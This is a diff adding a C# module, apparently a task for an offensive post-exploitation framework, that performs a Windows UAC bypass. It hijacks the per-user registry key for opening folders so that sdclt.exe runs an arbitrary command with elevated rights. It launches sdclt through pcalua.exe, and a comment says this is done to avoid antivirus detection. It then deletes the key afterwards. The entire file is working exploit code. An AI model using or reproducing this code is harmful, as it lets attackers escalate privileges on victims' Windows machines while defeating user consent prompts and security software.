@@ -1,0 +1,38 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Diagnostics;
+using System.Threading;
+
+public static class Task
+{
+	public static string Execute(string Command = "")
+    {
+        try
+        {
+            string key = @"Software\Classes\Folder\shell\open\command";
+            RegistryKey commandKey = Registry.CurrentUser.CreateSubKey(key);
+
+            commandKey.SetValue("", Command);
+            commandKey.SetValue("DelegateExecute", "");
+
+			// We use a lolbas to execute sdclt.exe as it is detected by av if executed directly
+            using (var process = new Process())
+            {
+                process.StartInfo.UseShellExecute = true;
+                var windir = Environment.GetEnvironmentVariable("windir");
+                process.StartInfo.FileName = windir + @"\system32\pcalua.exe";
+                process.StartInfo.Arguments = "-a " + windir + @"\system32\sdclt.exe";
+                process.StartInfo.CreateNoWindow = true;
+                process.Start();
+            }
+
+
+			// We need to wait a bit before deleting the key
+            Thread.Sleep(10000);
+            Registry.CurrentUser.DeleteSubKey(key);
+
+            return "UAC Bypass executed sucessfully";
+        }
+        catch (Exception e) { return e.ToString(); }
+    }
+}
